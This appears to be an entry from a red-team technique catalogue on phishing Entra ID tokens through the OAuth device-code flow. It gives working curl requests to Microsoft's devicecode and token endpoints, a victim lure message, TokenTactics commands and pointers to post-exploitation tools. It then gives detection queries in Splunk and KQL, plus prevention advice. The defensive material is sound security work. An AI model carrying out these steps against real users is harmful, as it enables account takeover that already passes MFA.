name: Azure Device-Code Phishing - Capture Entra Tokens
description: Abuse the OAuth 2.0 device-authorization flow to phish Entra ID (Azure AD) tokens. The attacker requests a device code against a first-party client, sends the victim the real https://microsoft.com/devicelogin page and a user_code, and when the victim authenticates (passing MFA), the attacker polls the token endpoint and receives the victim's access and refresh tokens - no password or credential ever touches the attacker.
notes:
=== WHY IT WORKS ===
  The device-code flow is meant for input-constrained devices. The victim
  authenticates on the genuine Microsoft page, so MFA and the real URL both
  look legitimate; the attacker just harvests the resulting tokens.

=== STEP 1: REQUEST A DEVICE CODE (attacker) ===
  # first-party client id (Azure CLI shown); FOCI clients give broad refresh tokens
  curl -s -X POST \
    'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode' \
    -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' \
    -d 'scope=https://graph.microsoft.com/.default offline_access'
  # returns device_code, user_code, verification_uri, interval

=== STEP 2: LURE (send to victim) ===
  "Go to https://microsoft.com/devicelogin and enter code: <user_code>"

=== STEP 3: POLL FOR TOKENS (attacker) ===
  curl -s -X POST \
    'https://login.microsoftonline.com/common/oauth2/v2.0/token' \
    -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
    -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46' \
    -d 'device_code=<device_code>'
  # once the victim signs in: access_token + refresh_token returned

=== EASIER WITH TOOLING ===
  # TokenTactics (PowerShell)
  Import-Module .\TokenTactics.ps1
  Get-AzureToken -Client MSGraph           # starts a device-code request
  # az CLI (your own login, or to show the flow):
  az login --use-device-code

=== USE THE TOKENS ===
  Refresh token -> mint tokens for Graph, ARM, Exchange, etc.
  Pass to AADInternals / GraphRunner / ROADtools for post-exploitation.

defense.why_it_works: The device-code grant lets any client start an authentication the victim completes on the genuine Microsoft sign-in page. Because the victim sees a real URL and satisfies MFA normally, the phish is convincing, and the attacker receives valid access and refresh tokens without ever handling a credential.
defense.prerequisites: A public client_id (first-party IDs work and often need no consent), network access to login.microsoftonline.com, and a victim willing to enter the user_code on the device-login page within the code's validity window.
defense.impact: Theft of valid Entra access and refresh tokens, including FOCI refresh tokens that mint tokens for many first-party resources - effectively account takeover that already passed MFA.
defense.detection: [MITRE T1528] Entra sign-in logs with authenticationProtocol=deviceCode, especially where the sign-in IP/device differs from where tokens are later used; device-code sign-ins to Azure CLI / other first-party clients the user does not normally use.
defense.artifacts: Entra ID SigninLogs events with AuthenticationProtocol=deviceCode; subsequent token use from a different IP/ASN than the interactive sign-in; unusual appId (e.g. Azure CLI 04b07795-...).
defense.splunk_spl:
index=azure sourcetype=azure:aad:signin authenticationProtocol=deviceCode
| stats count values(appDisplayName) by userPrincipalName, ipAddress
| where count>0
defense.sentinel_kql:
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| summarize Count=count(), IPs=make_set(IPAddress) by UserPrincipalName, AppDisplayName
defense.prevention: Block the device-code flow with a Conditional Access authentication-flows policy except for the few device types that need it; require compliant/managed devices; user-train against entering codes they did not initiate; alert on any deviceCode sign-in and on token use from a new IP shortly after.

detections.name: Entra device-code authentication (phishing)
detections.logic:
SigninLogs
| where AuthenticationProtocol == "deviceCode"
| summarize Count=count(), IPs=make_set(IPAddress), Apps=make_set(AppDisplayName) by UserPrincipalName, bin(TimeGenerated, 1h)
detections.false_positives: Legitimate device-code use on input-constrained devices (smart TVs, IoT, some CLI logins)
detections.tuning: Allowlist expected device-code client IDs/users; alert on new UPNs and on tokens later used from a different IP
